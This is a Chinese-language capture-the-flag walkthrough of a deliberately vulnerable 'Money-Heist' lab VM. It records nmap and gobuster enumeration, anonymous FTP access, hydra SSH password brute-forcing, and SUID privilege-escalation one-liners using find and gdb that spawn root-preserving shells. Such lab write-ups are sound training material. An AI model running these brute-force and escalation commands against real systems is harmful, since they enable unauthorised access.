VirtualBox 打开改项目环境：右键设置找到USB接口勾选去掉！即可运行
网卡选择桥接：wifi

192.168.2.156


1、nmap 192.168.2.0/24 -sP
MAC Address: 72:78:36:BF:99:1F (Unknown)
Nmap scan report for Money-Heist.lan (192.168.2.156)


2、nmap 192.168.2.156 -p- -A

21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             138 Nov 19  2020 note.txt

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
55001/tcp open  ssh   OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)

开启了web页面、21匿名枚举！


3、ftp匿名枚举

ftp 192.168.2.156
anonymous
anonymous
dir 
-rw-r--r--    1 0        0             138 Nov 19  2020 note.txt

get note.txt

//*//  Hi I'm Ángel Rubio partner of investigator Raquel Murillo. We need your help to catch the professor, will you help us ?  //*//


4、web信息收集

gobuster dir -u http://192.168.2.156 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

/img                  (Status: 301) [Size: 312] [--> http://192.168.2.156/img/]
/robots               (Status: 301) [Size: 315] [--> http://192.168.2.156/robots/]
/gate                 (Status: 301) [Size: 313] [--> http://192.168.2.156/gate/]  
/server-status        (Status: 403) [Size: 278]


5、图片损坏修复枚举

最开始提示：
无法显示图像“http://192.168.2.156/robots/tokyo.jpeg”，因为它包含错误。

wget http://192.168.2.156/robots/tokyo.jpeg
robots/目录跟进是一张图片下载打不开，file是data类型！

修复图片：hexeditor

Hex Editor II是一个简单、易用的工具，Hex编辑器可通过文本、十六进制、十进制或二进制形式编辑任意文件，其一系列的编辑特性能有效提高您的工作效率。Hex Editor II是一款小众软件，体积小、功能专！

      *  可以编辑非常大的文件 – 高达4GB的；
      *  具有4种编辑模式(文本、十六进制、十进制、二进制)；
      *  内置了两个插件(Hex Calculator 与 Base Converter) ;
      *  可快速加载文件。

hexeditor tokyo.jpeg

file signature wiki   ---查看所有文件签名类型
https://en.wikipedia.org/wiki/List_of_file_signatures

查找jpeg：
FF D8 FF E0 00 10 4A 46
49 46 00 01

0A 4A EE E0  ---可以看到签名头部不对应！需要改为：FF D8 FF E0
然后ctrl+x 回车保存！

查看图片就是一句话....没啥有用的！！



6、exe文件枚举

wget http://192.168.2.156/gate/gate.exe

file gate.exe 
gate.exe: Zip archive data

mv gate.exe gate.zip       ----0 bety

strings gate.zip                                                                                                                                                         
noteUT	
/BankOfSp41n
noteUT

发现存在目录：/BankOfSp41n

http://192.168.2.156/BankOfSp41n   ---又是一张图片！下载没发现隐写内容！

继续爆破目录：
gobuster dir -u http://192.168.2.156/BankOfSp41n/  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html

/index.html           (Status: 200) [Size: 384]
/login.php            (Status: 200) [Size: 1434]


http://192.168.2.156/BankOfSp41n/login.php 
发现是个登录页面！！

<script src="CR3D5.js"></script>
查看页面源代码发现CR3D5.js！


6、web

跟进CR3D5.js文件：

anonymous
B1tCh

登录后查看源码：
view-source:http://192.168.2.156/BankOfSp41n/indax.html

Hey! help please I'm Arturo Román they are very-dangerous and one more thing may be  old things won't work they are UPDATED, please help me!!!

发现存在Arturo用户！


7、暴力破解

hydra -l arturo -P /usr/share/wordlists/rockyou.txt -s 55001 ssh://192.168.2.156

或者windows的gorailgun.exe破解！
rockyou需要爆破半小时以上！！！

或者用：
用该字典：/usr/share/wfuzz/wordlist/general/big.txt
hydra -l arturo -P /usr/share/wfuzz/wordlist/general/big.txt -s 55001 ssh://192.168.2.156

[55001][ssh] host: 192.168.2.156   login: arturo   password: corona



8、内部信息收集

ssh arturo@192.168.2.156 -p 55001
corona

登录进去发现：secret.txt
------
/*/ Arturo gets phone somehow and he call at police headquater /*/

	" Hello, I'm Arturo, I'm stuck in there with almost 65-66 hostages,
       	and they are total 8 with weapons, one name is Denver, Nairo.... "
------
查看secret.txt 发现可疑用户 Denver、Nairo
其实在home底下已经发现了存在四个用户！



9、提权

---s--s--x 1 denver  denver     217K Feb  8  2016 /usr/bin/find
---s-ws--x 1 nairobi denver      72K Feb 12  2016 /bin/sed
-rwsrwx--- 1 tokyo   nairobi    6.3M Jun 10  2017 /usr/bin/gdb


find提权--->找到文件才发现隐藏的目录

https://gtfobins.github.io/gtfobins/find/#suid
find . -exec /bin/sh -p \; -quit

------------------------------------------
cat secret_diary

They all understimate me, mainly Nairobi and Tokyo,  they think only they can lead the team and I can't. 
Tokyo is like Maserati you know. But I hate both of them,
Now I leave a thing on browser which should be secret, Now Nairobi will resposible for this...

/BankOfSp41n/0x987654/
------------------------------------------
发现存在隐藏目录！



10、莫斯密码破解

在web隐藏目录下发现隐藏文件：
cd /var/www/html/BankOfSp41n/0x987654


------------------------------------------
Don't trust anyone so quickly, until can see everything clearly!!!



.-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / .-.-.- / / .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / .-.-.- / / .-.-.- / .-.-.- / / .-.-.- .-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- / / .-.-.- / .-.-.- / / .-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- .-.-.- / .-.-.- .-.-.- / / .-.-.- .-.-.- / .-.-.- / / .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / / .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.- / / .-.-.- / .-.-.- .-.-.- .-.-.- / / .-.-.- .-.-.- .-.-.- / .-.-.- .-.-.- .-.-.- .-.-.- .-.-.-
------------------------------------------

用CyberChef摩斯解码：cryptii
https://cryptii.com/

将值复制到左边的Text内容框中：然后点击Decode解密->选择Morse code：
------------------------------------------
.. .....  ..... .  . ....  ..... .  . .  ... ...  .. ...  .. ...  . .  .. .....  ... ..  .. .  . .....  . .....  ... .....  . ...  ... .....
------------------------------------------
Tap Code继续解码：
选择第二个+号：Decode->Tap code解密：
jvdvanhhajmfeepcp
------------------------------------------
Rot13解码：
选择第三个+号：Decode->ROT13
wiqinauunwzsrrcpc
------------------------------------------
仿射密码解码：
选择第四个+号：Decode->Affine Cipher
iamabossbitchhere


解释：
Morse Code一般指摩尔斯电码。 摩尔斯电码也被称作摩斯密码，是一种时通时断的信号代码，通过不同的排列顺序来表达不同的英文字母、数字和标点符号。

敲击码(Tap code)
敲击码(Tap code)是一种以非常简单的方式对文本信息进行编码的方法。因该编码对信息通过使用一系列的点击声音来编码而命名，敲击码是基于5×5方格波利比奥斯方阵来实现的，不同点是是用K字母被整合到C中。
https://blog.csdn.net/X__WY__X/article/details/108745237

ROT13（回转13位，rotate by 13 places，有时中间加了个连字符称作ROT-13）是一种简易的替换式密码！
https://baike.baidu.com/item/ROT13/7086083?fr=aladdin

仿射密码为单表加密的一种，字母系统中所有字母都藉一简单数学方程加密，对应至数值，或转回字母。
https://baike.baidu.com/item/仿射密码/2250198?fr=aladdin



11、暴力破解

hydra -L user.txt -p iamabossbitchhere -s 55001 ssh://192.168.2.156

[55001][ssh] host: 192.168.2.156   login: nairobi   password: iamabossbitchhere

获得用户名密码！


12、继续提权

ssh nairobi@192.168.2.156 -p 55001
iamabossbitchhere
登录成功！

https://gtfobins.github.io/gtfobins/gdb/#suid

gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit

提权到tokyo用户！
查看/home目录下的隐藏文件：
Romeo Oscar Oscar Tango Stop Papa Alfa Sierra Sierra Whiskey Oscar Romeo Delta : India November Delta India Alfa One Nine Four Seven

这句话意思告诉root密码为：india1947

su root
ssh root
拿到root权限！


























































